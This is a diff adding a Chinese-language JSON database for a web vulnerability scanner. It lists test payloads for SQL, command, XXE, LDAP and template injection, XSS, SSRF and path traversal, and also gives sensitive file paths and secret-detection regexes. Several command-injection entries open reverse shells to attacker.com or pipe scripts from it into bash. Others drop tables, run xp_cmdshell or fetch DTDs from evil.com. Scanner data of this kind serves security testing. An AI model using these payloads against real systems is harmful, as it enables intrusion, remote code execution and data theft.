@@ -1,0 +1,346 @@
+{
+  "version": "2.0.0",
+  "last_updated": "2026-03-09",
+  "description": "增强版漏洞检测数据库 - 包含多种漏洞类型的Payloads和检测规则",
+  
+  "vulnerabilities": {
+    "sql_injection": {
+      "name": "SQL注入",
+      "owasp": "A03:2021-Injection",
+      "severity": "critical",
+      "description": "通过用户输入执行恶意SQL语句",
+      "payloads": [
+        {"value": "' OR '1'='1", "type": "boolean_based"},
+        {"value": "' OR '1'='1' --", "type": "boolean_based"},
+        {"value": "' OR '1'='1'/*", "type": "boolean_based"},
+        {"value": "1' AND '1'='1", "type": "boolean_based"},
+        {"value": "1' AND '1'='1'--", "type": "boolean_based"},
+        {"value": "1 UNION SELECT NULL--", "type": "union_based"},
+        {"value": "1 UNION SELECT NULL,NULL--", "type": "union_based"},
+        {"value": "1 UNION SELECT NULL,NULL,NULL--", "type": "union_based"},
+        {"value": "'; DROP TABLE users;--", "type": "stacked_query"},
+        {"value": "admin'--", "type": "auth_bypass"},
+        {"value": "' UNION SELECT * FROM users--", "type": "union_based"},
+        {"value": "1' ORDER BY 1--", "type": "order_by"},
+        {"value": "1' ORDER BY 10--", "type": "order_by"},
+        {"value": "1' AND SLEEP(5)--", "type": "blind"},
+        {"value": "1'; WAITFOR DELAY '0:0:5'--", "type": "blind"},
+        {"value": "1' AND (SELECT COUNT(*) FROM users)>0--", "type": "blind"},
+        {"value": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "type": "error_based"},
+        {"value": "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "type": "mssql"},
+        {"value": "'; EXEC xp_cmdshell('whoami');--", "type": "rce"},
+        {"value": "1' WAITFOR DELAY '00:00:05'--", "type": "blind"}
+      ],
+      "error_patterns": [
+        "sql syntax", "mysql_fetch", "mysql_num_rows", "ora-", 
+        "postgresql error", "sqlite3 error", "unterminated", 
+        "syntax error at or near", "sqlerror", "microsoft sql",
+        "odbc sql server", "sqlserver exception", "invalid sql",
+        "sql injection", "warning mysql", "php mysql"
+      ]
+    },
+    
+    "xss": {
+      "name": "跨站脚本攻击(XSS)",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "description": "在页面中注入恶意脚本",
+      "payloads": [
+        {"value": "<script>alert('XSS')</script>", "type": "basic"},
+        {"value": "<img src=x onerror=alert(1)>", "type": "img_onerror"},
+        {"value": "<svg/onload=alert(1)>", "type": "svg"},
+        {"value": "javascript:alert(1)", "type": "javascript"},
+        {"value": "<body onload=alert(1)>", "type": "body"},
+        {"value": "'-alert(1)-'", "type": "string_break"},
+        {"value": "<input onfocus=alert(1) autofocus>", "type": "input"},
+        {"value": "<iframe src=javascript:alert(1)>", "type": "iframe"},
+        {"value": "{{constructor.constructor('alert(1)')()}}", "type": "template"},
+        {"value": "<script>eval(atob('YWxlcnQoMSk='))</script>", "type": "encoded"},
+        {"value": "<div onmouseover=alert(1)>hover</div>", "type": "event"},
+        {"value": "<marquee onstart=alert(1)>", "type": "event"},
+        {"value": "<details open ontoggle=alert(1)>", "type": "html5"},
+        {"value": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></table>", "type": "bypass"},
+        {"value": "<scr<script>ipt>alert(1)</scr</script>ipt>", "type": "filter_bypass"},
+        {"value": "<ScRiPt>alert(1)</sCrIpT>", "type": "case_bypass"},
+        {"value": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onload=alert(1)//'>", "type": "comment_bypass"},
+        {"value": "<img src=x onerror=alert(1)>", "type": "advanced"}
+      ],
+      "detection_methods": [
+        {"method": "reflection", "description": "检查payload是否在响应中反射"},
+        {"method": "event_handler", "description": "检查事件处理器是否被触发"},
+        {"method": "javascript_execution", "description": "检查JavaScript是否执行"}
+      ]
+    },
+    
+    "command_injection": {
+      "name": "命令注入",
+      "owasp": "A03:2021-Injection",
+      "severity": "critical",
+      "description": "在服务器端执行恶意系统命令",
+      "payloads": [
+        {"value": "; ls -la", "type": "basic"},
+        {"value": "| ls -la", "type": "pipe"},
+        {"value": "`ls -la`", "type": "backtick"},
+        {"value": "$(ls -la)", "type": "substitution"},
+        {"value": "; cat /etc/passwd", "type": "file_read"},
+        {"value": "| whoami", "type": "basic"},
+        {"value": "&& whoami", "type": "and"},
+        {"value": "; id", "type": "basic"},
+        {"value": "| nc -e /bin/sh attacker.com 1234", "type": "reverse_shell"},
+        {"value": "; wget http://attacker.com/shell.sh -O /tmp/shell.sh", "type": "download"},
+        {"value": "| curl http://attacker.com/shell.sh | bash", "type": "curl_pipe"},
+        {"value": "'; cat /etc/passwd #", "type": "comment"},
+        {"value": "| passwd", "type": "password_change"},
+        {"value": "; gcc -o shell shell.c 2>&1", "type": "compile"},
+        {"value": "| bash -i >& /dev/tcp/attacker.com/port 0>&1", "type": "reverse_shell"},
+        {"value": "0wn3d", "type": "backdoor"}
+      ],
+      "response_indicators": [
+        {"pattern": "root:", "description": "passwd文件泄露"},
+        {"pattern": "bin/bash", "description": "shell信息"},
+        {"pattern": "uid=", "description": "用户ID泄露"},
+        {"pattern": "groups=", "description": "组信息泄露"},
+        {"pattern": "/bin/sh", "description": "shell路径"},
+        {"pattern": "bash:", "description": "bash版本"}
+      ]
+    },
+    
+    "ssrf": {
+      "name": "服务端请求伪造",
+      "owasp": "A10:2021-SSRF",
+      "severity": "high",
+      "description": "服务器被诱导向内部系统发起请求",
+      "payloads": [
+        {"value": "http://localhost/", "type": "localhost"},
+        {"value": "http://127.0.0.1/", "type": "localhost"},
+        {"value": "http://metadata.google/", "type": "cloud_metadata"},
+        {"value": "http://169.254.169.254/", "type": "cloud_metadata"},
+        {"value": "http://[::1]/", "type": "ipv6"},
+        {"value": "http://0.0.0.0/", "type": "ipv4"},
+        {"value": "http://2130706433/", "type": "decimal_ip"},
+        {"value": "http://0177.0.0.1/", "type": "octal_ip"},
+        {"value": "http://0x7f000001/", "type": "hex_ip"},
+        {"value": "http://metadata.google.internal/", "type": "gcp"},
+        {"value": "http://169.254.169.254/metadata/v1/", "type": "aws"},
+        {"value": "http://metadata.google/computeMetadata/v1/", "type": "gcp"},
+        {"value": "file:///etc/passwd", "type": "file_protocol"},
+        {"value": "gopher://127.0.0.1:6379/_INFO", "type": "gopher"}
+      ],
+      "detection_indicators": [
+        "localhost", "127.0.0.1", "0.0.0.0", "metadata", 
+        "169.254", "internal", "private", "local"
+      ]
+    },
+    
+    "xxe": {
+      "name": "XML外部实体注入",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "description": "解析XML时加载恶意外部实体",
+      "payloads": [
+        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "type": "file_read"},
+        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><foo>&xxe;</foo>", "type": "ssrf"},
+        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "type": "windows"},
+        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://whoami\">]><foo>&xxe;</foo>", "type": "command"},
+        {"value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]>", "type": "external_dtd"}
+      ],
+      "error_patterns": [
+        "xml", "entity", "dtd", "doctype", "xxe", "external",
+        "xmlparsedom", "documentbuilder"
+      ]
+    },
+    
+    "csrf": {
+      "name": "跨站请求伪造",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "medium",
+      "description": "诱导用户执行非预期的操作",
+      "detection_methods": [
+        {"method": "token_check", "description": "检查是否存在CSRF Token"},
+        {"method": "referer_check", "description": "检查Referer验证"},
+        {"method": "custom_header", "description": "检查自定义头部"}
+      ],
+      "form_analysis": {
+        "missing_tokens": "表单缺少CSRF Token",
+        "no_referer_validation": "未验证Referer头",
+        "unsafe_methods": "使用不安全HTTP方法"
+      }
+    },
+    
+    "idor": {
+      "name": "不安全的直接对象引用",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "high",
+      "description": "未验证用户是否有权访问指定对象",
+      "test_patterns": [
+        {"pattern": "/user/{id}", "description": "用户ID遍历"},
+        {"pattern": "/order/{id}", "description": "订单ID遍历"},
+        {"pattern": "/profile/{id}", "description": "资料ID遍历"},
+        {"pattern": "/file/{id}", "description": "文件ID遍历"},
+        {"pattern": "/api/user/{id}", "description": "API用户ID"}
+      ],
+      "indicators": [
+        "unauthorized", "access denied", "forbidden", "permission denied",
+        "not allowed", "invalid token", "session expired"
+      ]
+    },
+    
+    "path_traversal": {
+      "name": "路径遍历",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "high",
+      "description": "通过路径遍历访问敏感文件",
+      "payloads": [
+        {"value": "../etc/passwd", "type": "basic"},
+        {"value": "..\\..\\windows\\win.ini", "type": "windows"},
+        {"value": "....//....//....//etc/passwd", "type": "bypass"},
+        {"value": "..%252f..%252f..%252fetc/passwd", "type": "double_encode"},
+        {"value": "..%c0%af..%c0%af..%c0%afetc/passwd", "type": "utf8_encode"},
+        {"value": "/etc/passwd", "type": "absolute"},
+        {"value": "c:\\windows\\win.ini", "type": "windows_absolute"},
+        {"value": "..\\..\\..\\..\\..\\etc\\passwd", "type": "deep_traverse"},
+        {"value": "%2e%2e/etc/passwd", "type": "single_encode"},
+        {"value": "..;/etc/passwd", "type": "semicolon_bypass"}
+      ],
+      "response_indicators": [
+        {"pattern": "root:", "description": "passwd内容"},
+        {"pattern": "[fonts]", "description": "win.ini内容"},
+        {"pattern": "[extensions]", "description": "win.ini内容"},
+        {"pattern": "<?xml", "description": "XML文件"},
+        {"pattern": "<!DOCTYPE", "description": "HTML文件"}
+      ]
+    },
+    
+    "open_redirect": {
+      "name": "开放重定向",
+      "owasp": "A10:2021-SSRF",
+      "severity": "medium",
+      "description": "未验证的重定向可能用于钓鱼攻击",
+      "payloads": [
+        {"value": "https://evil.com", "type": "basic"},
+        {"value": "//evil.com", "type": "protocol_relative"},
+        {"value": "///evil.com", "type": "triple_slash"},
+        {"value": "javascript:alert(1)", "type": "javascript"},
+        {"value": "data:text/html,<script>alert(1)</script>", "type": "data_uri"},
+        {"value": "https://google.com", "type": "legit_domain"},
+        {"value": "..\\evil.com", "type": "relative_path"},
+        {"value": "http://example.com/../evil.com", "type": "path_traversal"}
+      ],
+      "detection_methods": [
+        {"method": "status_code", "description": "检查3xx重定向"},
+        {"method": "location_header", "description": "检查Location头"},
+        {"method": "reflection", "description": "检查参数是否反射"}
+      ]
+    },
+    
+    "ldap_injection": {
+      "name": "LDAP注入",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "description": "通过LDAP查询注入",
+      "payloads": [
+        {"value": "*)(uid=*))(|(uid=*", "type": "authentication_bypass"},
+        {"value": "admin)(&(password=*)", "type": "auth_bypass"},
+        {"value": "*)(objectClass=*", "type": "information_disclosure"},
+        {"value": ")(cn=*", "type": "wildcard"},
+        {"value": "*)|(uid=*", "type": "or_injection"}
+      ],
+      "error_patterns": [
+        "ldap", "error", "invalid", "syntax", "naming",
+        "initial", "context", "search", "filter"
+      ]
+    },
+    
+    "template_injection": {
+      "name": "模板注入",
+      "owasp": "A03:2021-Injection",
+      "severity": "critical",
+      "description": "在模板引擎中执行恶意代码",
+      "payloads": [
+        {"value": "{{7*7}}", "type": "jinja2"},
+        {"value": "${7*7}", "type": "freemarker"},
+        {"value": "<%= 7*7 %>", "type": "erb"},
+        {"value": "{{config}}", "type": "jinja2_config"},
+        {"value": "#{7*7}", "type": "spring"},
+        {"value": "{{''.__class__.__mro__[2].__subclasses__()}}", "type": "jinja2_rce"},
+        {"value": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "type": "flask_rce"}
+      ],
+      "detection_indicators": [
+        "49", "7*7=49", "config", "builtins", "subclasses"
+      ]
+    }
+  },
+  
+  "sensitive_paths": {
+    "description": "敏感文件和目录",
+    "paths": [
+      {"path": "/.git/config", "severity": "high", "description": "Git配置泄露"},
+      {"path": "/.svn/entries", "severity": "high", "description": "SVN信息泄露"},
+      {"path": "/.env", "severity": "critical", "description": "环境变量泄露"},
+      {"path": "/.aws/credentials", "severity": "critical", "description": "AWS凭证泄露"},
+      {"path": "/phpinfo.php", "severity": "high", "description": "PHP配置信息"},
+      {"path": "/info.php", "severity": "high", "description": "PHP配置信息"},
+      {"path": "/server-status", "severity": "medium", "description": "Apache状态"},
+      {"path": "/actuator/env", "severity": "high", "description": "Spring配置泄露"},
+      {"path": "/actuator/health", "severity": "low", "description": "Spring健康检查"},
+      {"path": "/swagger-ui.html", "severity": "medium", "description": "API文档泄露"},
+      {"path": "/api-docs", "severity": "medium", "description": "API文档泄露"},
+      {"path": "/v2/api-docs", "severity": "medium", "description": "API文档泄露"},
+      {"path": "/admin", "severity": "medium", "description": "管理后台"},
+      {"path": "/administrator", "severity": "medium", "description": "管理后台"},
+      {"path": "/login", "severity": "low", "description": "登录页面"},
+      {"path": "/phpmyadmin", "severity": "high", "description": "数据库管理"},
+      {"path": "/wp-admin", "severity": "medium", "description": "WordPress管理"},
+      {"path": "/wp-config.php", "severity": "critical", "description": "WordPress配置"},
+      {"path": "/xmlrpc.php", "severity": "medium", "description": "WordPress XMLRPC"},
+      {"path": "/backup", "severity": "high", "description": "备份目录"},
+      {"path": "/backups", "severity": "high", "description": "备份目录"},
+      {"path": "/db", "severity": "high", "description": "数据库目录"},
+      {"path": "/database", "severity": "high", "description": "数据库目录"},
+      {"path": "/api/v1/users", "severity": "medium", "description": "用户API"},
+      {"path": "/api/admin", "severity": "high", "description": "管理API"},
+      {"path": "/api/config", "severity": "high", "description": "配置API"},
+      {"path": "/.DS_Store", "severity": "low", "description": "Mac文件泄露"},
+      {"path": "/composer.json", "severity": "medium", "description": "依赖信息"},
+      {"path": "/package.json", "severity": "low", "description": "依赖信息"},
+      {"path": "/.htaccess", "severity": "medium", "description": "Apache配置"},
+      {"path": "/web.config", "severity": "medium", "description": "IIS配置"}
+    ]
+  },
+  
+  "security_headers": {
+    "description": "必需的安全响应头",
+    "headers": [
+      {"name": "Strict-Transport-Security", "severity": "high", "description": "启用HSTS", "recommendation": "max-age=31536000; includeSubDomains"},
+      {"name": "Content-Security-Policy", "severity": "high", "description": "内容安全策略", "recommendation": "default-src 'self'"},
+      {"name": "X-Content-Type-Options", "severity": "medium", "description": "防止MIME sniffing", "recommendation": "nosniff"},
+      {"name": "X-Frame-Options", "severity": "medium", "description": "防止点击劫持", "recommendation": "DENY or SAMEORIGIN"},
+      {"name": "Referrer-Policy", "severity": "low", "description": "引用策略", "recommendation": "strict-origin-when-cross-origin"},
+      {"name": "Permissions-Policy", "severity": "low", "description": "浏览器功能策略", "recommendation": "geolocation=(), microphone=()"},
+      {"name": "X-XSS-Protection", "severity": "low", "description": "XSS过滤器", "recommendation": "1; mode=block"}
+    ]
+  },
+  
+  "sensitive_data_patterns": {
+    "description": "敏感信息检测正则",
+    "patterns": [
+      {"pattern": "api[_-]?key[\"']?\\s*[:=]\\s*[\"']?[\\w-]{20,}", "type": "API Key", "severity": "critical"},
+      {"pattern": "secret[\"']?\\s*[:=]\\s*[\"']?[\\w-]{20,}", "type": "密钥", "severity": "critical"},
+      {"pattern": "password[\"']?\\s*[:=]\\s*[\"']?[^\\s\"\\'<]{6,}", "type": "密码", "severity": "critical"},
+      {"pattern": "token[\"']?\\s*[:=]\\s*[\"']?[\\w-]{20,}", "type": "Token", "severity": "high"},
+      {"pattern": "Bearer\\s+[\\w-]+\\.?[\\w-]*", "type": "Bearer Token", "severity": "high"},
+      {"pattern": "eyJ[A-Za-z0-9_-]*\\.eyJ[A-Za-z0-9_-]*\\.[A-Za-z0-9_-]*", "type": "JWT", "severity": "high"},
+      {"pattern": "aws[_-]?access[_-]?key[_-]?id[\"']?\\s*[:=]\\s*[\"']?[\\w-]{20,}", "type": "AWS Key", "severity": "critical"},
+      {"pattern": "-----BEGIN\\s+(RSA\\s+)?PRIVATE\\s+KEY-----", "type": "私钥", "severity": "critical"},
+      {"pattern": "github[_-]?token[\"']?\\s*[:=]\\s*[\"']?[\\w-]{20,}", "type": "GitHub Token", "severity": "high"},
+      {"pattern": "connection[_-]?string[\"']?\\s*[:=]\\s*[\"']?[^\\s\"\\'<]{20,}", "type": "数据库连接", "severity": "critical"}
+    ]
+  },
+  
+  "update_info": {
+    "version": "2.0.0",
+    "last_check": "2026-03-09",
+    "update_url": "https://raw.githubusercontent.com/example/vuln-db/main/vuln_db.json",
+    "auto_update": false
+  }
+}
